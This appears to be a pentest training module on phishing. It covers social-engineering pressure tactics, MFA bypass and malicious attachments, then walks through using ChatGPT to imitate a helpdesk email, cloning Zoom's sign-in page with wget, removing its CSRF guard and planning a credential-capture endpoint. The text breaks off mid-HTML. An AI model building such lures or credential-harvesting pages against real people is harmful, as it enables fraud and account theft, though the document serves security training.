# Phishing Fundamentals

Phishing attacks are categorized into two main types: **broad phishing** and **spear phishing**. A typical phishing campaign targets many people at once with generic messages designed for broad appeal. In contrast, spear phishing targets specific individuals with personalized attacks, requiring detailed research. A spear phishing attack requires research into targets' behaviors, preferences, and vulns to create convincing messages. This information is crucial for creating a convincing campaign and pretext that targets are like to fail for.

Attackers now leverage Generative AI to improve social engineering tactics. By using AI-augmented technologies such as LLMs, process large amounts of public data to identify potential phishing targets. This approach helps attackers streamline the research process and personalize their attacks.

Attackers have also begun leveraging Gen AI audio models to clone voices and generative video models to create deepfake videos that convincingly replicate an individual's facial expressions, movements, and voice patterns.

## Phishing 101

### Email

The email text is often crafted with a particular goal, such as convincing the target to perform an action that will execute code. In this case, the attacker will likely include a malicious attachment in the email and persuade the target to open it, which triggers the execution of a specific payload. Malicious attachments can take different forms, including Office documents, PDFs, 7zip/zip archives, shortcut files, and calendar invites.

Attackers may embed a link that leads to an exploit-laden website. Clicking on these links can lead to the exploitation of vulns in specific browsers, enabling the attacker to run code on the target's machine.

Alternatively, the email text might attempt to persuade the user to clink a link which connects them to a malicious website which closely resembles a site the user often logs into. If the user logs in, the attacker gains possession of those credentials.

In phishing, a pretext is a fake story designed to convince someone to open a link or attachment. A successful attack relies on a believable pretext. Small details matter - typos, bad grammar, and formatting mistakes can expose the scam. The pretext should be as believable and as seamless as possible to avoid raising suspicion.

This requires solid social engineering skills, a strong command of the target's primary language, and details collected through research to add realism to the attack and convince the target to take the desired action.

Despite this information, crafting a convincing remains complex. For example, your email must come from a familiar, or at least a seemingly benign source and you should align other email-based metadata with something the target might expect. For example, if you send an email from an unfamiliar domain, the recipient is less likely to open it and engage with it. To address this, attackers often purchase look-alike domains resembling the target's organization, its vendors, or other familiar companies.

Along these lines, if an attacker gains access to a legitimate email account from the target's organization or one of the target's clients, they will use that account as it significantly improves their chances of success.

As for the pretext, it must align with the expectations of a target. If, for example, you're attempting to run a phishing campaign against the HR department of an organization, you should align your pretext with the kinds of emails an HR department is used to receiving. Getting this right takes some research, and often some working knowledge of the target's department and job rules.

It's also worth mentioning **whaling**, a form of spear phishing that focuses on high-profile individuals. These targeted attacks require more care and attention than a typical phishing campaign. These pretexts are often highly customized and require significant  research or inside knowledge of the target.

There are also very generic approaches you might take in phishing. One generic approach involves mimicking an email from a commonly used service like Slack, Zoom, Google's Gmail, or Microsoft Teams, which links to a cloned website which resembles that particular service. This is sometimes known as clone phishing. This approach can be useful for large-scale phishing campaigns.

### Smishing, Vishing, and Chatting

In addition to more-traditional email-based phishing campaigns, attackers can also leverage **smishing** to phish a target through SMS or other mobile messaging platforms.

SMS is a more personal and direct than email communication. The effectiveness of a smishing attack depends on the target. For example, a phishing message sent to a work phone should have a work-related context, while one sent to a personal phone would seem more authentic if it includes references to specific friends or family. In addition, since the target will not have the source phone number in their contact list, an attacker must add pretext to address this. These are crucial considerations when attempting to smish a target.

For example, in a popular "CEO gift card scam", the attacker poses as a senior executive trying to send an employee a gift card. This could sway a target, especially if they believe the message came from a company executive.

Another category of phishing is voice phishing, sometimes called **vishing**, in which an attacker calls a target on the phone, and speaks to them directly. Traditional vishing relies on more on social engineering skill rather than technical skilll.

You cann also use [caller ID spoofing techniques](https://usa.kaspersky.com/resource-center/preemptive-safety/phone-number-spoofing) in smishing and vishing campaigns to alter the sender or caller's source number. This has become more common because of the prevalence of VoIP tech.

In an adjacent style of social engineering attack known as SIM swapping, attackers call a mobile network provider and claim to be the owner of a specific mobile phone account. They then convince the network provider to transfer the phone number from the target's SIM card to a SIM card they control. This gives them control over the target's phone number, until the target is able to recover their access. This can of course be used for spoofing, but more critically, it is often used to bypass phone-based MFA protections.

### Enhancing Phishing through Social Engineering

Social engineering relies on psychological manipulation rather than technical expertise. This means attackers use more "human" judgement when deploying them, which is refined over time through some trial and error. Borrowing from this, as pentesters, you want your phishing campaign to be as believable as possible, and adding some social engineering "spice" can introduce a little pressure which may encourage your targets to ignore their more sensible rational judgements.

Gaining the target's trust is the ultimate goal of any successful phishing campaign. You want your target to trust in your phish enough to entice them to follow through with what you are asking them to do. This requires you make a good impression. Put simply, your pretext must align with the target's expectations and avoid raising suspicion.

By extension, your pretext must align with your payload. For example, if your pretext suggests you are from a particular company, the landing page behind your malicious link must mirror that company's web page. The domain of the sending address and URL link must also pass at least a cursory inspection, which is why skilled phishers often purchase lookalike domain names. Minute details are also important, such as a TLS-enabled website since an insecure HTTP connection could raise suspicion. Carelessness can erode trust, so details matter.

But technical elements aren't the only factors in creating trust. You also need to use softer skills. For example, if you are impersonating a particular person attempt to approximate that person's writing tone. You also want it to feel familiar and not raise suspicion. A more sophisticated tactict involves establishing rapport with the target before persuading them to open a malicious file or link.

Recognizing how to build trust is probably the most fundamental skill in successful phishing. However, there are other strategies you should consider in a phishing campaign.

Urgency is a common social engineering technique used by phishers, manipulating targets into acting quickly without questioning the safety of the requested action or critically reflecting on what they're doing. Introducing a sense of urgency works best in organizations which have unhealthy work cultures. If a target often receives urgent requests and is expected to deliver on them without any critical thought, they are much more likely to fall for these kinds of manipulation.

Another strategy, fear, can cause a target to momentarily suspend their judgement, increasing the likelihood of compliance. Authority, a similar strategy to fear, can amplify the urgency of your request. This often involves taking on the role of a superior, or even company's CEO. These strategies must be balanced as you consider elements of trust and the benefits of creating a good rapport.

Finally, you'll often leverage a positive incentive like a reward, in a process known as baiting in which you offer something tangible to lure a target into performing an action. The promise might include a gift card, cash, or another incentive or intangible benefits like gaining favor with a superior. Offering something tangible in exchange for participation in something like a survey is not an uncommon approach for companies in general. This kind of approach might blend into the background noise for some targets.

The social elements of a phish directly correlate to the success rate of the campaign. Exploiting a trust relationship, and possibly adding other kinds of manipulation along the way, you can help a target suspend their judgement, which can improve the effectiveness of a phishing campaign.

## Payloads, Misdirection, and Speedbumps

### The Role of Inbound Email Filters

The most common technologies designed to impact phishing campaigns include inbound email filters, which scan all incoming email for markers of malicious behavior, and block them if they look suspicious.

Most email filtering technologies consider the relative reputation of an incoming email's domain. This is calculated in various ways depending on the product, but most tend to use repuation block lists, in combination with other factors like the relative age of the sender's email domain.

Most email filtering products scrutinize file attachments, so you must leverage evasion techniques when delivering your payloads. Certain file attachments are especially scrutinized, including EXE and SCR file types, which are often considered malicious. Depending on the product, other executables may be considered malicious, including Office documents, PDF files, archive files, or script files as well as hyperlinks that point to external domains hosting these file types.

As a fallback, many organizations also explicitly flag email originating from external domains with visible markers. For example, an incoming email from an external domain might have its subject prepended with a string like `[EXTERNAL]`. This is designed to give users a quick visual warning that the email has come from outside the organization, even if it has been designed to look as though it comes from a colleague.

Email-based phishing campaigns encounter numerous roadblocks that must be navigated for success.

### Identifying Risks of Malicious Office Macros

Phishers find the Microsoft Office suite extremely useful due to its exploitable features. Given its widespread use, Microsoft Office has become a prime target for phishers over the years, who embed payloads in these documents and distribute them in their campaigns.

Several applications in the Microsoft Office family support Visual Basic for Applications, a built-in scripting language that enables Office documents to execute custom macros. Macros are intended to make Office documents more dynamic with embedded automation, which can be useful when distributing documents in a large organization.

Attackers have been using malicious Office macros to execute code for a long time.

Microsoft has attempted to address malicious macros. First, they disabled them by default, forcing users to explicitly enable them. Microsoft also introduced the Mark of the Web, a file attribute set by Windows when a file is downloaded from an external source. This is enabled by Windows' default NTFS file system.

Here's an example of MotW shown in a file's properties:

![phishing fundamentals offsec 1](../../../images/phishing_fundamentals_offsec1.png)

Windows applications can reference the MotW to determine whether a file should be trusted. Some applications will choose not to trust applications that appear to have been downloaded from an external source.

In an example of this, Microsoft introduced Protected View, which presents a warning when users open Office documents with the MotW attribute set. In this case, users must take action to bypass the warning and edit the document or use its dynamic content, including macros.

In a recent development, Microsoft started blocking macros running in any documents with a MotW by default. This makes phishing with Office macros less effective, since any file downloaded from an email will have the MotW attribute set.

Administrators can also enforce these various protections at the AD Group Policy level, preventing domain-attached machines from exiting the Protected View, or running macros at all. These kinds of protections can't be overwritten by individual users.

While Office macros have been commonly used for phishing campaigns in the past, they are likely to become less common in the near future. However, you should not discount them as an attack vector. Many organizations run outdated versions of Microsoft Office, preventing them from implementing the lastest security features. In addition, some enterprises only apply basic Group Policies to Office documents, potentially disabling security features.

### Assess Threats from Malicious Files

Macros aren't the only files that can execute client-side code. While Windows-based EXE files are executable it's statistically unlikely that these files will even reach a target's inbox. Even if an EXE file reached its intended destination, most users are aware of the danger of this type of file. Because of this, attackers have moved to other types of files, including SCR files, HTA files, and JScript files.

However, given the popularity of Office documents in enterprise environments, attackers have begun using other ancillary Office documents that may skirt the protections of mainstream Word, PowerPoint or Excel documents.

For example, [CVE-2017-11882](https://nvd.nist.gov/vuln/detail/CVE-2017-11882) is a memory corruption vuln in the Equation Editor, which was bundled with Microsoft Office until 2018. Even as late as 2023, some endpoint protection vendors reported seeing active exploitation of this vuln targeting organizations who had not updated Office.

Similarly, [CVE-2023-21716](https://nvd.nist.gov/vuln/detail/CVE-2023-21716) is a vuln in Microsoft Word which targets the RTF file parser. [PoCs for this vuln](https://github.com/JMousqueton/CVE-2023-21716) are also publicly available.

Even though vulns related to Microsoft Office documents can grant code execution without macros, this approach is somewhat limited given the typical enterprise patch cycle.

Other applications are also prone to file parsing vulns, including PDF viewers. Adobe Acrobat Reader is a common target for attackers and vulnerability researchers alike. Consider [CVE-2023-21608](https://nvd.nist.gov/vuln/detail/CVE-2023-21608), which is a use-after-free vuln. Several [public PoCs for this vuln](https://github.com/hacksysteam/CVE-2023-21608) can execute arbitrary code.

In an especially advanced targeted phishing attack, you could evenl everage a vuln in a piece of software which you know your target runs. In this case, you would research the kinds of software your target may be using and try to find vulns which may affect that software. Different industries tend to use different kinds of software from document readers such as Office and Adobe Reader or email clients such as Outlook to browsers such as Google Chrome. You could even research job postings or websites such as Glassdoor, LinkedIn, company websites, software review websites like G2 Crowd or Capterra, industry-specific forums or blogs, and technology news websites to gain information about technology used by the target organization.

Some advanced attackers may even try to find 0-day vulns in a piece of software they know a target is using. This is a common approach in spearphishing attacks.

### Recognize Malicious Links

Attackers may attempt to bypass the various file protecton mechanisms by convincing targets to click on malicious links.

One approach to credential harvesting is to host a website clone of a commonly used service, like:

- Google's Gmail
- Zoom
- Microsoft login page

This in conjunction with a convincing pretext in the phishing email, might be enough to convince a target to enter their real credentials, which you can then capture and reuse.

However, password manager applications will expose these websites as frauds since they will only trigger on the proper domain. They won't, for example, enter stored credentials for `microsoft.com` into `m1crosoft.com`.

In some more advanced link-based phishing attempts, an attacker might not try to extract credentials at all. Instead, they might link to a web page which triggers a browser exploit which would allow them to run arbitrary code. However, this approach is quite advanced, and uncommon without access to a browser exploit 0-day or N-day, a very reliable exploit, and a target opening your link in the specific vulnerable browser.

In other more specific cases, a malicious web page might also try to exploit a Cross-Site Request Forgery exploit. These kinds of vulnerabilities rely on the fact that a target's browser might haven an existing session open with a specific browser to perform some action on. For example, they might be able to create a page which forces a logged-in user to create a new account on a particular service.

Regardless of the approach, the link must appear credible and enticing. You could use social engineering to make the link more enticing and make it appear harmless. In addition, when the target opens the link, you want to make sure that the actual URL doesn't look too suspicious. URLs with random strings, or strings which are inappropriate to the pretext of the phish, will likely alarm the target.

To achieve this, you might obfuscate the embedded link using a URL shortener such as [TinyURL](https://tinyurl.com/) or [Bitly](https://bitly.com/). However, the third-party service might disable your link if the service provider discovers the link points to malware.

You might also consider using homograph URLs. These are URLs that replace ASCII chars in a URL with chars from the Cyrillic, Greek, or Latin alphabets. For example, [_apple.com_](https://www.apple.com/) and [_аррӏе.com_](https://www.xn--1za7fqa6ba.com/) look very similar. However, the "l" in the second URL is replaced with the Cyrillic "l". In many browsers, these will render almost identically in the URL bar. However, they actually point at totally different websites.

There are other details you need to consider to make a malicious site look convincing. HTTPS is typically required because sites without TLS are rare, especially on sites that ask for login information. So you need to point the target to a site which uses valid HTTPS, in order to avoid the obvious warning that most browsers will display when connecting to an insecure website.

Approaches like CSRF, which compel a target to authenticate to a resource, may inadvertently leak information or enable unauthorized actions that are advantageous to attackers.

For example, although Windows has begun deprecating NTLM, you could leverage an authentication leak against older systems. In this scenario, an attacker could send a malicious link that forces authentication and, when the target clicks the link, the system enters into an NTLM handshake. The attacker could then capture the NetNTLMv2 hash. This could also work through an embedded link pointing to an image on an SMB server. If the target opens the message containing the image, this could trigger the handshake and compromise the hash. Although this approach has become somewhat dated, it has been spotted in the wild as recently as [February 2024](https://www.proofpoint.com/uk/blog/threat-insight/ta577s-unusual-attack-chain-leads-ntlm-data-theft).

### Differentiate Credential Phishing and Multi-Factor Authentication

Once you have credentials, you may hit another roadblock in the form of Multi-Factor Authentication. This is another security mechanism which many organizations implement to slow down an attack, even in the event of credential compromise.

There are several ways you might want to handle this. One common technique is [prompt bombing](https://www.tripwire.com/state-of-security/mfa-prompt-bombing-what-you-need-know), which targets MFA applications that use push-based authentication prompts. In this strategy, you bombard the target with login attempts, which trigger prompts on their phone asking them approve the login. This can create a phenomenon known as MFA fatigue, where users assume the authorization requests are legitimate and accept one to stop the alerts.

Another approach to defeat MFA is to add the MFA prompt directly into the credential-stealing website's login flow. This allows you to capture not only the victim's username and password but also their MFA token. However, once you've obtained the token, you must relay it to the legitimate application immediately since MFA tokens typically have a very short lifespan. This means timing is critical. While this approach only gives you single-use access to the target application, it can still be highly effective when used surgically and with detailed planning.

An alternative method involves a browser-in-the-middle attack, where an attacker proxies a real session to capture authentication details. To the target, it appears they are interacting with the legitimate website, which they are. However, the session they create upon logging in is actually under the attacker's control. Tools like [cuddlephish](https://github.com/fkasler/cuddlephish) help automate this kind of attack. Using such a tool requires access to a public IP address and can not be easily setup locally. If you're doing an assumed breach type pentest and are attempting to get access to internal web applications then such limitations become important.

Another technical approach to bypass MFA is brute-forcing. Since an MFA token is often six numbers, you could, at least in theory, attempt to brute-force it. This will obviously take time and bandwith, assuming the MFA server even allows unlimited attempts and an response window.

You could also assume a less-technical approach and use social engineering. For example, you could contact a target directly, acting as a trusted figure like the company helpdesk, or a member of the IT department, and ask the target to provide the MFA token. This would generally require a very solid pretext.

Finally, if an MFA token is delivered by SMS, some criminal actors might also engage in SIM swapping to gain access to a target's phone number, and receive the MFA token themselves. This isn't something you can generally do in legitimate pentesting, due to the legal implications of the attack. However, it's important to understand this tactic as it is leveraged against SMS-based MFA systems.

## Hands-On Credential Phishing

### Creating a Zoom Credential Phishing Pretext

The compromised email account (`helpdesk@mail.corp.com`) belongs to the helpdesk department of the CORP.com enterprise. This account appears to be shared among multiple users and only contains internal email correspondence. While you have access to the email address, the credentials don't seem to be reused anywhere else. Your next step is to use this limited access to attempt to expand your control and obtain more sensitive data.

You'll use the credentials contained in the public leak data, logging in with the `helpdesk@mail.corp.com` username and enter `Helpdesk@Password2024` as the password.

![phishing fundamentals offsec 2](../../../images/phishing_fundamentals_offsec2.png)

Now that you have access to this account, do some light recon. First, you'll read some of the outgoing emails. Eventually you find a recent email sent from this address to multiple individuals in the organization's sales department:

![phishing fundamentals offsec 3](../../../images/phishing_fundamentals_offsec3.png)

The email refers to the sales department's Zoom licenses and instructs employees to log into Zoom within the next two weeks to keep their license active. The emails seem to have a very distinct voice and communication style. You'll imitate their style in your phishing email. If you have strong writing skills, you can do this yourself, but this is also an easy task for an LLM.

Take this email sent from the helpdesk account and feed it to an LLM, along with a prompt asking it to write an email in that style.

```
Looking at the following email: 

"Hello Sales department, 

Hope you're knocking it out of the park this week! We're trying to redo our inventory of Zoom licenses as we seem to have a large number which aren't being used at the moment. Rather than having everyone reply to the email, in order to keep your Zoom license, please just ensure that you login to your account and schedule a meeting within the next two weeks. Any accounts which don't do this within the time frame will be transitioned to a free license. 

Thank you very much for your cooperation and apologies for the hassle!" 

Write another email in the same style as this, and include a reminder for employees to login to Zoom. Include a hyperlink that can be clicked and directs people to the appropriate page.  
```

You pass this text to ChatGPT and, after a few seconds, you are provided with the following email example:

```
Subject: Reminder: Please Log In to Keep Your Zoom License!

Hello Sales department,

Just a quick reminder—hope everything’s going smoothly on your end! We’re still working on updating our Zoom license inventory and noticed that some accounts haven’t yet logged in to schedule a meeting. To make sure your account remains on a full license, please click here to log in and schedule a meeting within the next week.

If no meeting is scheduled by the deadline, any inactive accounts will be moved to a free license.

Thanks again for your cooperation, and sorry for the added task! Let us know if you have any questions.

Best regards,
[Your Company] Helpdesk Team
```

This output maintains consistency with the tone of your previous emails. Depending on the email structure provided, you may want to tweak it a bit, but for now this is a good start.

### Cloning a Legitimate Website

Your credential phishing page will closely mimic the official Zoom sign-in page.

An internet search for "Zoom signin" points you to [this](https://zoom.us/signin#/) page:

![phishing fundamentals offsec 4](../../../images/phishing_fundamentals_offsec4.png)

This will work as a good template. To clone this page, you'll create a `ZoomSignin` folder, where you'll store the various page resources you'll need.

```bash
kali@kali:~$ mkdir ZoomSignin

kali@kali:~/ZoomSignin$ cd ZoomSignin
```

From within this directory, you can now use `wget` to clone the page, and grab all its assets.

You use `-E` to change the file extension to match the MIME type of the downloaded file. You'll convert all the links in the document to point to local alternatives with `-k` and use `-K` to save the original file with a `.orig` extension. Next, you'll use `-p` to download all the files necessary for viewing the specific page. The `-e robots=off` will ignore `robots.txt` directives which might otherwise hinder your download. You'll download all files from external hosts with `-H`, limited to files on the `zoom.us` domain with `-Dzoom.us`. Finally, you will use `-nd` to save all files in a flat directory structure in your current working directory.

```bash
kali@kali:~/ZoomSignin$ wget -E -k -K -p -e robots=off -H -Dzoom.us -nd "https://zoom.us/signin#/login"

--2024-11-11 10:56:16--  https://zoom.us/signin
Resolving zoom.us (zoom.us)... 170.114.52.2, 2407:30c0:182::aa72:3402
Connecting to zoom.us (zoom.us)|170.114.52.2|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: 'signin.html'

signin.html                                                    [ <=>                                                                                                                                    ]  39.86K  --.-KB/s    in 0.007s  

2024-11-11 10:56:16 (5.50 MB/s) - 'signin.html' saved [40821]

--2024-11-11 10:56:16--  https://zoom.us/assets/zm_bundle.js?cache
Reusing existing connection to zoom.us:443.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [application/javascript]
Saving to: 'zm_bundle.js?cache'

zm_bundle.js?cache                                             [ <=>                                                                                                                                    ]  24.04K  --.-KB/s    in 0s      

2024-11-11 10:56:16 (271 MB/s) - 'zm_bundle.js?cache' saved [24617]

...

FINISHED --2024-11-11 10:56:24--
Total wall clock time: 7.9s
Downloaded: 86 files, 5.2M in 0.9s (5.48 MB/s)
Converting links in signin.html... 42.
30-12
Converting links in vendors~app.fd300935.css... 2.
2-0
Converting links in internacional.min.css... 6.
6-0
Converting links in suisse.min.css... 12.
12-0
Converting links in notification.min.css... nothing to do.
Converting links in all.min.css... 60.
58-2
Converting links in app.95d42182.css... nothing to do.
Converting links in meeting_delete_dialog.min.css... nothing to do.
Converted links in 8 files in 0.009 seconds.
```

Now that you've made a clone of this page, list the downloaded files.

```bash
kali@kali:~/ZoomSignin$ ls -al
total 6112
drwxr-xr-x  2 root root    4096 Nov 11 10:56  .
drwx------ 22 root root    4096 Nov 11 10:56  ..
-rw-r--r--  1 root root     115 Nov  8 03:40  Add_a_question.png
-rw-r--r--  1 root root   54696 Nov  8 03:40  AlmadenSans-Book-WebXL.woff
-rw-r--r--  1 root root   42676 Nov  8 03:40  AlmadenSans-Book-WebXL.woff2
...
-rw-r--r--  1 root root    4005 Nov  8 03:40  share-ico-mobile.png
-rw-r--r--  1 root root   39964 Nov 11 10:56  signin.html
-rw-r--r--  1 root root   40821 Nov 11 10:56  signin.orig
-rw-r--r--  1 root root    8461 Nov  8 03:40  social_icons_footer.png
-rw-r--r--  1 root root     614 Nov  8 03:40  sort.png
-rw-r--r--  1 root root    1381 Nov 11 10:56  suisse.min.css
-rw-r--r--  1 root root    1741 Nov  8 03:40  suisse.min.css.orig
-rw-r--r--  1 root root  362956 Oct 11 09:32  vendors~app.688984ba.js
-rw-r--r--  1 root root  166967 Nov 11 10:56  vendors~app.fd300935.css
-rw-r--r--  1 root root  166985 Oct 11 09:31  vendors~app.fd300935.css.orig
-rw-r--r--  1 root root  417914 Nov  8 03:40  vue.min.js
-rw-r--r--  1 root root     388 Nov  8 03:40  warning.png
-rw-r--r--  1 root root     701 Nov  8 03:40  ycal.png
-rw-r--r--  1 root root     981 Nov 11 10:56 'zm_bundle.js?async'
-rw-r--r--  1 root root   24617 Nov 11 10:56 'zm_bundle.js?cache'
-rw-r--r--  1 root root    4286 Oct 22 14:21  zoom.ico
-rw-r--r--  1 root root  301690 Oct 11 09:32  zoomUI~app.15899df2.js
```

This command downloaded 6,112 files. This seems like a lot of files, but for now you'll assume these are all the files you need to create a real clone of this page. Set up an HTTP server to see how these render in your browser.

```bash
kali@kali:~/ZoomSignin$ sudo python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

![phishing fundamentals offsec 5](../../../images/phishing_fundamentals_offsec5.png)

This presents an OWASP CSRF Guard error alert box. This is somewhat expected since you tried to load externally-hosted JavaScript. You'll note this for now and click through the alert.

Next, you're presented with a cookie modal, and in the background, you see a clone of the official page.

![phishing fundamentals offsec 6](../../../images/phishing_fundamentals_offsec6.png)

The cookie modal is a very important detail which makes your site look more convincing. After all, most sites present these modals.

Click "Cookies Settings" and "CONFIRM MY CHOICES" to make sure nothing breaks. Once you do, you're presented with the full web page, which looks extremely convincing.

![phishing fundamentals offsec 7](../../../images/phishing_fundamentals_offsec7.png)

Now that you have a cloned page that looks and responds like the original, your next step is to enter a fake email address and password so you can see what happens if you attempt to sign in.

After clicking "Sign In", the page grays out and presents a spinning wheel. Nothing else happens.

![phishing fundamentals offsec 8](../../../images/phishing_fundamentals_offsec8.png)

Inspect the output of your Python3 http.server to figure out what's going on.

```bash
kali@kali:~/ZoomSignin$ sudo python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
127.0.0.1 - - [11/Nov/2024 11:34:52] "GET /signin.html HTTP/1.1" 304 -
127.0.0.1 - - [11/Nov/2024 11:34:53] "GET /zm_bundle.js%3Fcache HTTP/1.1" 200 -
127.0.0.1 - - [11/Nov/2024 11:34:53] "GET /zm_bundle.js%3Fasync HTTP/1.1" 200 -
127.0.0.1 - - [11/Nov/2024 11:34:53] "GET /optimizely.js HTTP/1.1" 304 -
127.0.0.1 - - [11/Nov/2024 11:34:53] "GET /suisse.min.css HTTP/1.1" 200 -
127.0.0.1 - - [11/Nov/2024 11:34:53] "GET /internacional.min.css HTTP/1.1" 200 -
127.0.0.1 - - [11/Nov/2024 11:34:53] "GET /all.min.css HTTP/1.1" 304 -
127.0.0.1 - - [11/Nov/2024 11:34:53] "GET /vendors~app.fd300935.css HTTP/1.1" 304 -
127.0.0.1 - - [11/Nov/2024 11:34:53] "GET /csrf_js HTTP/1.1" 200 -
127.0.0.1 - - [11/Nov/2024 11:34:53] code 404, message File not found
127.0.0.1 - - [11/Nov/2024 11:34:53] "GET /assets/zm_bundle.js?seed=AEATWBqTAQAAb8TJ2DwXXFcMPOkJIB1ej3cByqU0r4NYxWhZfpqf-JkTpW3A&uQHR71Sqnk--z=q HTTP/1.1" 404 -
127.0.0.1 - - [11/Nov/2024 11:35:00] code 501, message Unsupported method ('POST')
127.0.0.1 - - [11/Nov/2024 11:35:00] "POST /sendUserBehavior HTTP/1.1" 501 -
127.0.0.1 - - [11/Nov/2024 11:35:07] code 501, message Unsupported method ('POST')
127.0.0.1 - - [11/Nov/2024 11:35:07] "POST /sendUserBehavior HTTP/1.1" 501 -
```

The output includes a POST request to `sendUserBehavior`, which your Python3 http.server rejected with a 501 error. This is great information, revealing that you can create an endpoint at `/sendUserBehavior` as part of your malicious site, which will accept the POST request. You could then log the request, which should contain the credentials you are trying to steal.

### Cleaning Up the Clone

You have a few things to do before your phishing page is ready for prime time. The first thing you should do is remove the OWASP CSRFGuard code, which presented an alert box when you first loaded the page.

```bash
kali@kali:~/ZoomSignin$ grep "OWASP" *
csrf_js: * The OWASP CSRFGuard Project, BSD License
csrf_js: *    3. Neither the name of OWASP nor the names of its contributors may be used
csrf_js:                    this.setRequestHeader("X-Requested-With", "OWASP CSRFGuard Project");
csrf_js:        alert("OWASP CSRFGuard JavaScript was included from within an unauthorized domain!");
```

It seems the warning is in the `csrf_js` file. Find the web page that includes this file.

```bash
kali@kali:~/ZoomSignin$ grep "csrf_js" *
csrf_js:        xhr.open("POST", "/csrf_js"+(typeof(resourceAccountIdRoutingURl)!="undefined"?"?"+resourceAccountIdRoutingURl:""), false);
csrf_js:            xhr.open("POST", "/csrf_js"+(typeof(resourceAccountIdRoutingURl)!="undefined"?"?"+resourceAccountIdRoutingURl:""), false);
signin.html:<script nonce="Sxwi1J4PRJSzTs4fu1bzvQ" src="csrf_js"></script>
signin.orig:<script nonce="Sxwi1J4PRJSzTs4fu1bzvQ" src="/csrf_js"></script>
```

The file name appears in several places, however, you're most interested in the main `signin.html` page.

Delete this line from the `signin.html` page, save the file and reload the page. The CSRFGuard alert box is no longer displayed.

![phishing fundamentals offsec 9](../../../images/phishing_fundamentals_offsec9.png)

It's worth mentioning that you should check the HTML code for any other files imported from `zoom.us` because each of these requests will hit the Zoom servers. You want to minimize these requests as they could raise suspicion and increase the visibility of your phishing efforts. Overall, this will help you remain as stealthy as possible.

### Injecting Malicious Elements in the Clone

Now that you've taken care of the OWASP warning, focus on retrieving the submitted credentials.

First, move your phishing page to a proper web server which has better support for your POST requests. Before starting up another server, you'll kill your Python3 http.server process by hitting CTRL+C.

```bash
kali@kali:~/ZoomSignin$ mv -f * /var/www/html
kali@kali:~/ZoomSignin$ systemctl start apache2
kali@kali:~/ZoomSignin$ cd /var/www/html
```

You could try editing the existing login form to intercept the credentials, but this would mean sifting through code to figure out how the existing code works. Instead try to get an LLM to write your own form and overwrite it in `signin.html`.

Make a copy of the current page so you can compare the original with your modified version.

```bash
kali@kali:~/ZoomSignin$ cp -f signin.html signin_orig.html
```

Next, find the existing form. In Firefox, navigate to "Application Menu" > "More Tools" > "Web Developer Tools". From here, hover over various parts of the code to highlight various elements. Alternatively, you can click on the "Pick an element from the page button" highlighted below, hover over the "Sign in" div, and click on it to locate the source code of it.

![phishing fundamentals offsec 10](../../../images/phishing_fundamentals_offsec10.png)

You'll eventually find that the form is enclosed in a div element with an id attribute named "app". This div element includes a header and two nested div tags that control the image display on the left side of the webpage and the login form placement on the right side. This is a good starting point, however, you're only seeing the outermost div tag in the `signin.html` file:

```bash
<div id="nested" class="zoom-newpd">
<div class="mini-layout" role="main" aria-label="main content">
<div class="HiddenText"><a id="the-main-content" tabindex="-1"></a></div>
<div id="app"></div>
</div>
```

This is likely because that code is dynamically generated. You could trace this dynamic code, but that will only slow you down. After all, you're going to replace this code with LLM-generated code.

Copy as much as possible from the original page. You know that the div has a header inside which you can most likely copy from within the developer tools by right-clicking on the header element and selecting the "Copy" followed by "OUTER HTML".

![phishing fundamentals offsec 11](../../../images/phishing_fundamentals_offsec11.png)

Next, change the id of the div inside the `signin.html`, to avoid using the dynamically generated code, page and paste the output for the header.

```html
<div id="nested" class="zoom-newpd">
<div class="mini-layout" role="main" aria-label="main content">
<div class="HiddenText"><a id="the-main-content" tabindex="-1"></a></div>

<div id="custom_login">

<header class="layout-header"><a href="/" class="login-page-logo-wrap"><img src="https://st1.zoom.us/fe-static/fe-signup-login-active/img/ZoomNewLogo.b2fd5c95.png" width="200" alt="Zoom Logo" class=""><!----></a><div class="header-links"><span class="header-login-link" style="float: left; line-height: 32px;">New to Zoom?</span><button type="button" class="mgl-xs zm-button--link zm-button--small zm-button"><span class="zm-button__slot"> Sign Up Free </span></button><!----><a type="button" role="link" target="_blank" href="https://support.zoom.us/hc/en-us" tabindex="0" class="mgl-lg header-login-link zm-button--link zm-button--small zm-button is-link"><span class="zm-button__slot"> Support </span></a><div class="zm-dropdown"><button type="button" class="mgl-lg zm-button--primary-ghost zm-button--small is-ghost zm-button zm-dropdown-selfdefine" aria-label="Language English" role="button" aria-haspopup="listbox" aria-controls="dropdown-menu-1889" aria-expanded="false" tabindex="0"><span class="zm-button__slot"> English </span><i aria-hidden="true" class="zm-icon-down"></i></button><ul role="menu" tabindex="-1" class="zm-dropdown-menu zm-popper" style="display: none;" id="dropdown-menu-1889"><li id="dropdown_item_dropdown-menu-1889-0" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"><!----> English </span></li><li id="dropdown_item_dropdown-menu-1889-1" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"><!----> Español </span></li><li id="dropdown_item_dropdown-menu-1889-2" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"><!----> Deutsch </span></li><li id="dropdown_item_dropdown-menu-1889-3" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"><!----> 简体中文 </span></li><li id="dropdown_item_dropdown-menu-1889-4" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"><!----> 繁體中文 </span></li><li id="dropdown_item_dropdown-menu-1889-5" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"><!----> Français </span></li><li id="dropdown_item_dropdown-menu-1889-6" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"><!----> Português </span></li><li id="dropdown_item_dropdown-menu-1889-7" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"><!----> 日本語 </span></li><li id="dropdown_item_dropdown-menu-1889-8" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"><!----> Русский </span></li><li id="dropdown_item_dropdown-menu-1889-9" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"><!----> 한국어 </span></li><li 